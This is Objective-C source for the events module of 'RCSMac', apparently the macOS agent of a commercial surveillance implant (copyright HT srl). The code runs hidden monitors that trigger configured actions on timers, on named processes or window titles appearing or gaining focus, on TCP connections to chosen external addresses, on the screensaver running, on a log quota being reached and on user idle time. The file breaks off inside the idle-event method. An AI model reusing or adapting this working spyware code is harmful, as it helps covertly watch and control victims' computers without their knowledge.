/*
 * RCSMac - Events
 *
 *  Provides all the events which should trigger an action
 *
 * Created by Alfredo 'revenge' Pesoli on 26/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#include <sys/param.h>
#include <sys/queue.h>
#include <sys/socket.h>
#include <sys/socketvar.h>
#include <sys/sysctl.h>

#include <net/route.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>

#include <netinet/in_pcb.h>
#include <netinet/ip_icmp.h>
#include <netinet/icmp_var.h>
#include <netinet/igmp_var.h>
#include <netinet/ip_var.h>
#include <netinet/tcp.h>
#include <netinet/tcpip.h>
#include <netinet/tcp_seq.h>

#define TCPSTATES
#include <netinet/tcp_fsm.h>
#include <netinet/tcp_var.h>
#include <netinet/udp.h>
#include <netinet/udp_var.h>

#include <wchar.h>

#import "RCSMEvents.h"
#import "RCSMTaskManager.h"
#import "RCSMDiskQuota.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"


// That's really stupid, check param.h
// MAXCOMLEN	16		/* max command name remembered */ 
#define SCREENSAVER_PROCESS @"ScreenSaverEngin"

extern NSString *RCSMaxLogQuotaReached;

static RCSMEvents *sharedEvents = nil;
static NSMutableArray *connectionsDetected = nil;
NSLock *connectionLock;


@implementation RCSMEvents

@synthesize mEventQuotaRunning;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSMEvents *)sharedEvents
{
  @synchronized(self)
  {
    if (sharedEvents == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
        connectionsDetected = [[NSMutableArray alloc] init];
      }
  }
  
  return sharedEvents;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedEvents == nil)
      {
        sharedEvents = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedEvents;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedEvents != nil)
      {
        self = [super init];
    
        if (self != nil)
          {
            mEventQuotaRunning = NO;
            sharedEvents = self;
          }
      }
  }
  return sharedEvents;
}

#pragma mark -
#pragma mark Events monitor routines
#pragma mark -


- (BOOL)isEventEnable: (NSDictionary*) configuration
{
  BOOL enabled = TRUE;
  
  @synchronized(configuration)
  {
    enabled = [[configuration objectForKey:@"enabled"] intValue];
  }
  
  return enabled;
}

- (BOOL)waitDelaySeconds:(NSDictionary*)configuration
{
  BOOL breaked = FALSE;
  int aDelay = [[configuration objectForKey:@"delay"] intValue];
  
  if (aDelay > 0)
    {
      for (int i=0; i<aDelay; i++) 
        { 
          if ([configuration objectForKey: @"status"] == EVENT_STOP ||
              [configuration objectForKey: @"status"] == EVENT_STOPPED) 
            {
              breaked = TRUE;
              break;
            }
          else
            sleep(1);
        }
    }
  
  sleep(1);
  
  return breaked;
}

- (void)tryTriggerRepeat:(int)anAction 
               withDealy:(int)aDelay 
            andIteration:(int)iter
                 maxDate:(NSDate*)aDate
        andConfiguration:(NSDictionary*)configuration
{
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  if (anAction == 0xFFFFFFFF)
    return;
    
  do 
  {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSDate *now = [NSDate date];
    
    if (iter > 0)
      iter--;
      
    if ([self waitDelaySeconds:configuration] == FALSE &&
        [now earlierDate: aDate] == now &&
        [self isEventEnable: configuration] == TRUE)
      [taskManager triggerAction: anAction];
    else
      break;
      
    [pool release];
    
  } while(iter == 0xFFFFFFFF || iter > 0);
  
  return;
}

- (BOOL)tryTriggerRepeat:(int)anAction 
               withDealy:(int)aDelay 
            andIteration:(int)iter
        andConfiguration:(NSDictionary*)configuration
{
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  if (anAction == 0xFFFFFFFF)
    return FALSE;
    
  do 
    {
      if (iter > 0)
        iter--;
      
      if ([self waitDelaySeconds:configuration] == FALSE && 
          [self isEventEnable: configuration] == TRUE)
        [taskManager triggerAction: anAction];
      else
        break;
    
    } while(iter == 0xFFFFFFFF || iter > 0);

  return TRUE;
}

// Done.!
- (void)eventTimer: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  NSDate *startThreadDate = [[NSDate date] retain];
  timerStruct *timerRawData;
  NSTimeInterval interval = 0;
  BOOL timerDailyTriggered = NO;

  [configuration retain];
  
  timerRawData = (timerStruct *)[[configuration objectForKey: @"data"] bytes];
  
  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
  int type          = timerRawData->type;
  uint low          = timerRawData->loDelay;
  uint high         = timerRawData->hiDelay;
  uint endActionID  = timerRawData->endAction;
  
  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
  int delay         = [[configuration objectForKey:@"delay"] intValue];
  int iter          = [[configuration objectForKey:@"iter"] intValue];
  int curriteration = 0;
  
  while ([configuration objectForKey: @"status"] != EVENT_STOP &&
         [configuration objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      switch (type)
        {
          // never in rcs8
          case TIMER_AFTER_STARTUP:
            {
              interval = [[NSDate date] timeIntervalSinceDate: startThreadDate];
              
              if (fabs(interval) >= low / 1000)
                {
                  if ([self isEventEnable: configuration] == TRUE)
                    [taskManager triggerAction: actionID];
                  
                  [self tryTriggerRepeat: repeat 
                               withDealy: delay 
                            andIteration: iter 
                        andConfiguration: configuration];
                                
                  if ([self isEventEnable: configuration] == TRUE)
                    [taskManager triggerAction: endActionID];
                    
                  [innerPool release];
                  [outerPool release];
                  
                  [NSThread exit];
                }
              
              break;
            }
          case TIMER_LOOP:
            {
              if ([self isEventEnable: configuration] == TRUE)
                [taskManager triggerAction: actionID];
              
              while (iter == 0xFFFFFFFF || curriteration < iter)
                {
                  if ([self waitDelaySeconds:configuration] == FALSE)
                    {
                      if ([self isEventEnable: configuration] == TRUE)
                        [taskManager triggerAction: repeat];
                      curriteration++;
                    }
                  else
                    {
                      break;
                    }
                }
              
              // event stopped: exit
              [configuration release];
              [innerPool release];
              [outerPool release];
              
              [NSThread exit];
              break;
            }
          case TIMER_DATE:
            {
              int64_t configuredDate = 0;
              configuredDate = ((int64_t)high << 32) | (int64_t)low;

              int64_t unixDate = (configuredDate - EPOCH_DIFF) / RATE_DIFF;
              NSDate *givenDate = [NSDate dateWithTimeIntervalSince1970: unixDate];
              
              if ([[NSDate date] isGreaterThan: givenDate])
                {
                  if ([self isEventEnable: configuration] == TRUE)
                    [taskManager triggerAction: actionID];
                
                  [self tryTriggerRepeat: repeat 
                               withDealy: delay 
                            andIteration: iter 
                        andConfiguration: configuration];
                  
                  if ([self isEventEnable: configuration] == TRUE)
                    [taskManager triggerAction: endActionID];

                  [configuration release];
                  [innerPool release];
                  [outerPool release];
                  
                  [NSThread exit];
                }
              
              break;
            }
          case TIMER_INST:
            {
              int64_t configuredDate = 0;
              // 100-nanosec unit from installation date
              configuredDate = ((int64_t)high << 32) | (int64_t)low;
              // seconds unit from installation date
              configuredDate = configuredDate*(0.0000001);
      
              NSDictionary *bundleAttrib =
              [[NSFileManager defaultManager] attributesOfItemAtPath: [[NSBundle mainBundle] executablePath]          
                                                               error: nil]; 
              
              NSDate *creationDate = [bundleAttrib objectForKey: NSFileCreationDate];
          
              if (creationDate == nil)
                break;
              
              NSDate *givenDate = [creationDate addTimeInterval: configuredDate];
            
              if ([[NSDate date] isGreaterThan: givenDate])
              {
                if ([self isEventEnable: configuration] == TRUE)
                  [taskManager triggerAction: actionID];
                
                [self tryTriggerRepeat: repeat 
                             withDealy: delay 
                          andIteration: iter 
                      andConfiguration: configuration];
                
                if ([self isEventEnable: configuration] == TRUE)
                  [taskManager triggerAction: endActionID];
                
                [configuration release];             
                [innerPool release];
                [outerPool release];

                [NSThread exit];
              }
              
              break;
            }
          case TIMER_DAILY:
            {
              //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
              NSDate *now = [NSDate date];
              
              NSRange fixedRange;
              fixedRange.location = 11;
              fixedRange.length   = 8;
              
              // UTC timers
              NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
              
              NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
              [inFormat setTimeZone:timeZone];
              [inFormat setDateFormat: @"yyyy-MM-dd hh:mm:ss ZZZ"];
              
              // Get current date string UTC
              NSString *currDateStr = [inFormat stringFromDate: now];
              [inFormat release];
              
              NSMutableString *dayStr = [[NSMutableString alloc] initWithString: currDateStr];
        
              // Set current date time to midnight
              [dayStr replaceCharactersInRange: fixedRange withString: @"00:00:00"];

              NSDateFormatter *outFormat = [[NSDateFormatter alloc] init];
              [outFormat setTimeZone:timeZone];
              [outFormat setDateFormat: @"yyyy-MM-dd hh:mm:ss ZZZ"];
              
              // Current midnite
              NSDate *dayDate = [outFormat dateFromString: dayStr];
              [outFormat release];
   
              [dayStr release];
              
              NSDate *lowDay  = [dayDate addTimeInterval: (low/1000)];  
              NSDate *highDay = [dayDate addTimeInterval: (high/1000)];        
              
              if (timerDailyTriggered == NO &&
                  [[now laterDate: lowDay] isEqualToDate: now] &&
                  [[now earlierDate: highDay] isEqualToDate: now])
                {
                  if ([self isEventEnable: configuration] == TRUE)
                    [taskManager triggerAction: actionID];
                  
                  [self tryTriggerRepeat: repeat 
                               withDealy: delay 
                            andIteration: iter 
                                 maxDate: highDay
                        andConfiguration: configuration];
                  
                  timerDailyTriggered = YES;
                } 
              else if (timerDailyTriggered == YES && 
                       ([[now laterDate: highDay] isEqualToDate: now] ||
                        [[now earlierDate: lowDay] isEqualToDate: now]) )
                {
                  if ([self isEventEnable: configuration] == TRUE)
                    [taskManager triggerAction: endActionID];
                  timerDailyTriggered = NO;
                }
              
              break;
            }
          default:
            {
              [innerPool release];
              [outerPool release];
              
              [NSThread exit];
            }
        }
      
      usleep(300000);
      
      [innerPool release];
    }
  
  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
      [configuration setValue: EVENT_STOPPED
                       forKey: @"status"];
    }
  
  [configuration release];
  
  if (startThreadDate != nil)
    [startThreadDate release];
  
  [outerPool release];
}

// Done.! rivedere lunghezza e utf16
- (void)eventProcess: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  NSString *process = nil;
  int processAlreadyFound = 0;
  processStruct *processRawData;

  [configuration retain];
  
  processRawData = (processStruct *)[[configuration objectForKey: @"data"] bytes];
  
  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
  int onTermination = processRawData->onClose;
  int lookForTitle  = processRawData->lookForTitle;  
  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
  int iter          = [[configuration objectForKey:@"iter"] intValue];
  int currentIter   = iter;
  
  unichar *_process = (unichar *)(processRawData->name);
  size_t _pLen       = _utf16len(_process);
  
  // Empty processName - exiting
  if (_pLen == 0)
    { 
      [configuration release];
      [outerPool release];
      [NSThread exit];
    }
    
  process = [[NSString alloc] initWithCharacters: (unichar *)_process
                                          length: _pLen];
    
  NSString *process_lowercaseString = [process lowercaseString];

                                                                                  
  BOOL onFocus  = NO;
  uint32_t mode = EVENT_PROCESS_NAME;
  
  if ((lookForTitle & EVENT_PROCESS_ON_FOCUS) == EVENT_PROCESS_ON_FOCUS)
    onFocus = YES;
  
  if ((lookForTitle & EVENT_PROCESS_ON_WINDOW) == EVENT_PROCESS_ON_WINDOW)
    mode = EVENT_PROCESS_WIN_TITLE;
  
  while ([configuration objectForKey: @"status"]    != EVENT_STOP
         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      switch (mode)
        {
        case EVENT_PROCESS_NAME:
          {
            if (processAlreadyFound != 0
                && findProcessWithName(process_lowercaseString) == YES
                && onFocus == YES)
              {
                //
                // Process was already found and we're looking for focus
                // thus we try to understand if the process has just lost focus
                //
                CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
                                                                   kCGNullWindowID);
                int firstPid = -1;
                
                for (NSMutableDictionary *entry in (NSArray *)windowList)
                  {
                    //
                    // kCGWindowLayer is equal 0 it means it's a windowed
                    // process (exclude tray process and stuff like that)
                    //
                    if ([[entry objectForKey: (id)kCGWindowLayer] intValue] == 0)
                      {
                        int _pid = [[entry objectForKey: (id)kCGWindowOwnerPID] intValue];
                        
                        if (firstPid == -1)
                          {
                            firstPid = _pid;
                          }
                        else if (firstPid != _pid)
                          {
                            // Ok, we're on the second element which is the process
                            // who just lost focus
                            NSString *procLostFocus = [entry objectForKey: (id)kCGWindowOwnerName];
                            
                            if (matchPattern([[procLostFocus lowercaseString] UTF8String],
                                             [process_lowercaseString UTF8String]))
                              {
                                processAlreadyFound = 0;
                                
                                if (onTermination != 0xFFFFFFFF &&
                                    [self isEventEnable: configuration] == TRUE)
                                    [taskManager triggerAction: onTermination];
                              }
                          }
                      }
                  }
                
                CFRelease(windowList);
              }
            else if (processAlreadyFound != 0
                     && findProcessWithName(process_lowercaseString) == NO
                     && onFocus == NO)
              {
                //
                // If process has already been found and we don't find it again, we
                // can clear the process found flag in order to trigger once again
                // the event in case the process is launched multiple times
                //
                processAlreadyFound = 0;
                
                if (onTermination != 0xFFFFFFFF &&
                    [self isEventEnable: configuration] == TRUE)
                  [taskManager triggerAction: onTermination];
              }
            else if (processAlreadyFound == 0 && findProcessWithName(process_lowercaseString) == YES)
              {
                //
                // If we're looking for focus, we need to grab the first window
                // on screen and match the windowOwner within the process name
                // we're currently looking for
                //
                if (onFocus == YES)
                  {
                    NSDictionary *windowInfo = getActiveWindowInfo();
                    NSString *procWithFocus  = [windowInfo objectForKey: @"processName"];
                    
                    if (matchPattern([[procWithFocus lowercaseString] UTF8String],
                                     [process_lowercaseString UTF8String]))
                      {
#ifdef DEBUG_EVENTS
                        warnLog(@"Process (%@) got focus", process);
#endif
                        processAlreadyFound = 1;
                      }
#ifdef DEBUG_EVENTS
                    else
                      {
                        verboseLog(@"process currently looking for: %@", process);
                        verboseLog(@"process with focus: %@", procWithFocus);
                      }
#endif
                  }
                else
                  {
                    // We're not looking for focus events
                    processAlreadyFound = 1;
                  }
                
                //
                // We can trigger the event if this flag is set to 1
                //
                if (processAlreadyFound == 1)
                  {
                    if (actionID != 0xFFFFFFFF &&
                        [self isEventEnable: configuration] == TRUE)
                      [taskManager triggerAction: actionID];

                    // restart triggering iter times the repeat action
                    currentIter = 0;
                  }
              }
            break;
          }
        case EVENT_PROCESS_WIN_TITLE:
          {
            BOOL titleFound = NO;
            
            //
            // First see if the given entry has focus or is found inside the
            // current window list
            //
            if (onFocus == YES)
              {
                NSDictionary *windowInfo = getActiveWindowInfo();
                NSString *procWithFocus  = [windowInfo objectForKey: @"windowName"];
                
#ifdef DEBUG_EVENTS
                verboseLog(@"win focus: %@", procWithFocus);
#endif
                if (matchPattern([[procWithFocus lowercaseString] UTF8String],
                                 [process_lowercaseString UTF8String]))
                  {
#ifdef DEBUG_EVENTS
                    warnLog(@"Window (%@) got focus", process);
#endif
                    titleFound = YES;
                  }
              }
            else
              {
                CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
                                                                   kCGNullWindowID);
                
                for (NSMutableDictionary *entry in (NSArray *)windowList)
                  {
                    NSString *windowName = [entry objectForKey: (id)kCGWindowName];

                    if (matchPattern([[windowName lowercaseString] UTF8String],
                                     [process_lowercaseString UTF8String]))
                      {
#ifdef DEBUG_EVENTS
                        warnLog(@"Window (%@) was found (no focus)", process);
#endif
                        titleFound = YES;
                      }
                  }
                
                CFRelease(windowList);
              }
            
            //
            // If title is found for the first time, trigger if avail
            //
            if (processAlreadyFound == 0 && titleFound == YES)
              {
                processAlreadyFound = 1;
                
                if (actionID != 0xFFFFFFFF &&
                    [self isEventEnable: configuration] == TRUE)
                  [taskManager triggerAction: actionID];
                  
                // restart triggering repeat action iter times
                currentIter = 0;
                                      
              }
            else if (processAlreadyFound != 0 && titleFound == YES)
              {
                //
                // Process was already found and we're looking for focus
                // thus we try to understand if the process has just lost focus
                //
                if (onFocus == YES)
                  {
                    CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
                                                                       kCGNullWindowID);
                    int firstPid = -1;
                    
                    for (NSMutableDictionary *entry in (NSArray *)windowList)
                      {
                        //
                        // kCGWindowLayer is equal 0 it means it's a windowed
                        // process (exclude tray process and stuff like that)
                        //
                        if ([[entry objectForKey: (id)kCGWindowLayer] intValue] == 0)
                          {
                            int _pid = [[entry objectForKey: (id)kCGWindowOwnerPID] intValue];
                            
                            if (firstPid == -1)
                              {
                                firstPid = _pid;
                              }
                            else if (firstPid != _pid)
                              {
                                // Ok, we're on the second element which is the process
                                // who just lost focus
                                NSString *procLostFocus = [entry objectForKey: (id)kCGWindowName];
                                
                                if (matchPattern([[procLostFocus lowercaseString] UTF8String],
                                                 [process_lowercaseString UTF8String]))
                                  {
                                    processAlreadyFound = 0;
                                    
                                    if (onTermination != 0xFFFFFFFF &&
                                        [self isEventEnable: configuration] == TRUE)
                                      [taskManager triggerAction: onTermination];
                                  }
                              }
                          }
                      }
                  
                    CFRelease(windowList);
                  }
              }
            else if (processAlreadyFound != 0 && titleFound == NO)
              {
                processAlreadyFound = 0;
              
                if (onTermination != 0xFFFFFFFF &&
                    [self isEventEnable: configuration] == TRUE)
                    [taskManager triggerAction: onTermination];
              }
          
            break;
          }
        default:
          break;
        }
    
     if (processAlreadyFound == 1)
       {
          if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
              [self waitDelaySeconds:configuration] == FALSE)
            {
              if ([self isEventEnable: configuration] == TRUE)
                [taskManager triggerAction: repeat];
              currentIter++;
            }
       }
      
      usleep(350000);

      [innerPool drain];
    }
  
  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
      [configuration setValue: EVENT_STOPPED
                       forKey: @"status"];
    }
  
  [process release];
  [configuration release];
  
  [outerPool drain];
}

// Done.!
- (void)eventConnection: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  char mibName[] = "net.inet.tcp.pcblist";
  connectionStruct *connectionRawData;
  BOOL connectionFound;
  struct xinpgen *xig, *oxig;
  struct tcpcb *tp = NULL;
  struct inpcb *inp;
  struct xsocket *so;
  size_t len = 0;
  char *buffer;

  [configuration retain];

  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
  int delay         = [[configuration objectForKey:@"delay"] intValue];
  int iter          = [[configuration objectForKey:@"iter"] intValue];
  int end           = [[configuration objectForKey:@"end"] intValue];
  
  while ([configuration objectForKey: @"status"]    != EVENT_STOP
         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      connectionFound = FALSE;
      
      connectionRawData = (connectionStruct *)[[configuration objectForKey: @"data"] bytes];
      
      u_long ipAddress   = connectionRawData->ipAddress;
      u_long netMask     = connectionRawData->netMask;
      int connectionPort = connectionRawData->port;
 
      struct in_addr tempAddress;
      tempAddress.s_addr = ipAddress;

#ifdef DEBUG_EVENTS
      verboseLog(@"IP Address to Match: %s", inet_ntoa(tempAddress));
#endif

      if (sysctlbyname(mibName, 0, &len, 0, 0) >= 0)
        {
          if ((buffer = malloc(len)) != 0)
            {
              if (sysctlbyname(mibName, buffer, &len, 0, 0) < 0)
                {
#ifdef DEBUG_EVENTS
                  errorLog(@"Error on second sysctlbyname call");
#endif
                  
                  free(buffer);
                  [configuration release];
                  [innerPool release];
                  [outerPool release];
                  [NSThread exit];
                }
            }
          else
            {
#ifdef DEBUG_EVENTS
              errorLog(@"Error on malloc");
#endif
              free(buffer);
              [configuration release];
              [innerPool release];
              [outerPool release];
              [NSThread exit];
            }
        }
      else
        {
#ifdef DEBUG_EVENTS
          errorLog(@"Error on first sysctlbyname call");
#endif
          
          free(buffer);
          [configuration release];
          [innerPool release];
          [outerPool release];
          [NSThread exit];
        }
      
      oxig = xig = (struct xinpgen *)buffer;
      
      struct in_addr netMaskStruct;
      netMaskStruct.s_addr = netMask;
      
      NSString *ip        = [NSString stringWithUTF8String: inet_ntoa(tempAddress)];
      NSNumber *port      = [NSNumber numberWithInt: connectionPort];
      NSString *ipNetmask = [NSString stringWithUTF8String: inet_ntoa(netMaskStruct)];
      
      //
      // Cycle through all the TCP connections
      //
      for (xig = (struct xinpgen *)((char *)xig + xig->xig_len);
           xig->xig_len > sizeof(struct xinpgen);
           xig = (struct xinpgen *)((char *)xig + xig->xig_len))
        {
          tp  = &((struct xtcpcb *)xig)->xt_tp;
          inp = &((struct xtcpcb *)xig)->xt_inp;
          so  = &((struct xtcpcb *)xig)->xt_socket;
          
          //
          // Check only for TCP and ESTABLISHED connections
          //
          extern char *tcpstates[];
          const char *state = "ESTABLISHED";
          
          if (so->xso_protocol == IPPROTO_TCP && strncmp(tcpstates[tp->t_state],
                                                         state,
                                                         strlen(state)) == 0)
            {
#ifdef DEBUG_EVENTS
              verboseLog(@"Found an established connection: %s", inet_ntoa(inp->inp_faddr));
              verboseLog(@"Configured netmask: %@", ipNetmask);
#endif
              
              //
              // Check if the ip belongs to any local network
              // and if it's the ip that we are looking for
              //
              if (isAddressOnLan(inp->inp_faddr) == FALSE
                  && compareIpAddress(inp->inp_faddr, tempAddress, netMask) == TRUE)
                {
#ifdef DEBUG_EVENTS
                  warnLog(@"Address in list: %s (not on lan)", inet_ntoa(inp->inp_faddr));
#endif
                  
                  if (connectionPort == 0 || inp->inp_fport == connectionPort)
                    {
                      connectionFound = TRUE;
                      
                      //
                      // Check if the address hasn't been detected already
                      //
                      if (isAddressAlreadyDetected(ip,
                                                   connectionPort,
                                                   ipNetmask,
                                                   connectionsDetected) == FALSE)
                        { 
                          NSArray *keys = [[NSArray alloc] initWithObjects: @"ip", @"port", @"netmask", nil];
                          NSArray *objects = [[NSArray alloc] initWithObjects: ip, port, ipNetmask, nil];
                          
                          NSDictionary *connection = [[NSDictionary alloc] initWithObjects: objects
                                                                                   forKeys: keys];
                          
                          [connectionLock lock];
                          [connectionsDetected addObject: connection];
                          [connectionLock unlock];
                          
                          [keys release];
                          [objects release];
                          [connection release];
                          
#ifdef DEBUG_EVENTS
                          warnLog(@"Event Connection triggered!");
#endif
                          if ([self isEventEnable: configuration] == TRUE)
                            [taskManager triggerAction: actionID];
                          
                          [self tryTriggerRepeat: repeat 
                                       withDealy: delay 
                                    andIteration: iter 
                                andConfiguration: configuration];
                          
                          if ([self isEventEnable: configuration] == TRUE)
                            [taskManager triggerAction: end];
                          
                        }
                    }
                }
            }
        }
      
      free(buffer);
      
      if (isAddressAlreadyDetected(ip,
                                   connectionPort,
                                   ipNetmask,
                                   connectionsDetected) == TRUE
          && connectionFound                            == FALSE)
        {
#ifdef DEBUG_EVENTS
          infoLog(@"Removing Connection");
#endif
          //
          // Connection has been found previously and now it's not there anymore
          // thus we remove it from our array in order to let it trigger again
          //
          NSArray *keys = [[NSArray alloc] initWithObjects: @"ip", @"port", @"netmask", nil];
          NSArray *objects = [[NSArray alloc] initWithObjects: ip, port, ipNetmask, nil];
          
          NSDictionary *connection = [[NSDictionary alloc] initWithObjects: objects
                                                                   forKeys: keys];
          [connectionLock lock];
          [connectionsDetected removeObject: connection];
          [connectionLock unlock];
          
          [keys release];
          [objects release];
          [connection release];
        }
      
      [innerPool release];
      usleep(500000);
    }
  
  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
      [configuration setValue: EVENT_STOPPED forKey: @"status"];
      
      [connectionsDetected removeAllObjects];
    }
    
  [configuration release];
  
  [outerPool release];
}

// Done.!
- (void)eventScreensaver: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];  
  BOOL screenSaverFound = FALSE;
  int onTermination;
    
  [configuration retain];
  
  [[configuration objectForKey: @"data"] getBytes: &onTermination];
  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
  int iter          = [[configuration objectForKey:@"iter"] intValue];
  int currentIter   = iter;
  
  NSString *process = [NSString stringWithString: SCREENSAVER_PROCESS];
  NSString *process_lowercaseString = [process lowercaseString];
  
  while ([configuration objectForKey: @"status"] != EVENT_STOP
         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      if (screenSaverFound == TRUE && findProcessWithName(process_lowercaseString) == NO)
        {
          screenSaverFound = FALSE;

          if (onTermination != 0xFFFFFFFF &&
              [self isEventEnable: configuration] == TRUE)
            {
              [taskManager triggerAction: onTermination];
            }
        }
      else if (screenSaverFound == FALSE && findProcessWithName(process_lowercaseString) == YES)
        {
          screenSaverFound = TRUE;
          
          if ([self isEventEnable: configuration] == TRUE)
            [taskManager triggerAction: actionID];
          
          currentIter = 0;
        }
      
    if (screenSaverFound == TRUE)
      {
        if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
            [self waitDelaySeconds:configuration] == FALSE)
          {
            if ([self isEventEnable: configuration] == TRUE)
              [taskManager triggerAction: repeat];
            currentIter++;
          }
      }
      
      [innerPool release];
      
      usleep(500000);
    }
  
  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
      [configuration setValue: EVENT_STOPPED forKey: @"status"];
    }

  [configuration release];
  
  [outerPool release];
}

- (void)eventQuotaNotificationCallback:(NSNotification*)aNotify
{
  NSNumber *actionId = (NSNumber*)[aNotify object];

  if (actionId && [actionId intValue] > -1)
    {
#ifdef DEBUG_EVENTS
    infoLog(@"event quota triggering action %@", actionId);
#endif
      [[RCSMTaskManager sharedInstance] triggerAction: [actionId intValue]];
    }
}

typedef struct {
  UInt32 disk_quota;
  UInt32 tag;
  UInt32 exit_event;
} quota_conf_entry_t;

// Done.!
- (void)eventQuota: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  [configuration retain];
  
  quota_conf_entry_t *params = (quota_conf_entry_t*)[[configuration objectForKey: @"data"] bytes];
  
  int exitAction    = params->exit_event;
  int enterAction   = [[configuration objectForKey: @"actionID"] intValue];
  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
  int iter          = [[configuration objectForKey:@"iter"] intValue];
  int currentIter = iter;
  
  // Setting parameter
  [[RCSMDiskQuota sharedInstance] setEventQuotaParam: configuration 
                                           andAction: [configuration objectForKey:@"actionID"]];
                                           
  while ([configuration objectForKey: @"status"] != EVENT_STOP
         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
    {
      if (mEventQuotaRunning == NO && [[RCSMDiskQuota sharedInstance] mMaxQuotaTriggered] == YES)
        {
          mEventQuotaRunning = YES;
          
          if ([self isEventEnable: configuration] == TRUE)
            [[RCSMTaskManager sharedInstance] triggerAction: enterAction];
          currentIter = 0;
        }
        
      if (mEventQuotaRunning == YES && [[RCSMDiskQuota sharedInstance] mMaxQuotaTriggered] == NO)
        {
          mEventQuotaRunning = NO;
          if ([self isEventEnable: configuration] == TRUE)
            [[RCSMTaskManager sharedInstance] triggerAction: exitAction];
        }
    
      if (mEventQuotaRunning == TRUE)
        {
          if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
              [self waitDelaySeconds:configuration] == FALSE &&
              [self isEventEnable: configuration] == TRUE)
            {
              [[RCSMTaskManager sharedInstance] triggerAction: repeat];
              currentIter++;
            }
        }
      
      usleep(300000);
    }
  
  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
      [configuration setValue: EVENT_STOPPED forKey: @"status"];
      
      mEventQuotaRunning = NO;
    }
    
  [configuration release];
  [outerPool release];
  
  return;
}

- (UInt32)getIdleSec
{
  int64_t idlesecs = -1;
  io_iterator_t iter = 0;
  int64_t nanoseconds = 0;
  
  if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"), &iter) == KERN_SUCCESS) 
    {
      io_registry_entry_t entry = IOIteratorNext(iter);
      
      if (entry) 
        {
          CFMutableDictionaryRef dict = NULL;
          if (IORegistryEntryCreateCFProperties(entry, &dict, kCFAllocatorDefault, 0) == KERN_SUCCESS) 
            {
              CFNumberRef obj = CFDictionaryGetValue(dict, CFSTR("HIDIdleTime"));
              if (obj) 
                {
                  
                  if (CFNumberGetValue(obj, kCFNumberSInt64Type, &nanoseconds)) 
                      idlesecs = (nanoseconds >> 30); // Divide by 10^9 to convert from nanoseconds to seconds.
                }
              CFRelease(dict);
            }
          
          IOObjectRelease(entry);
        }
      IOObjectRelease(iter);
    }
  
#ifdef DEBUG_EVENTS
  infoLog(@"%s: idle %lu sec", __FUNCTION__, idlesecs);
#endif
  
  return idlesecs;
}

- (BOOL)isInIdle:(UInt32) sec
{
  if ([self getIdleSec] > sec)
    return TRUE;
  else 
    return FALSE;
}

- (void)eventIdle:(NSDictionary*)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  BOOL amIInIdle = FALSE;
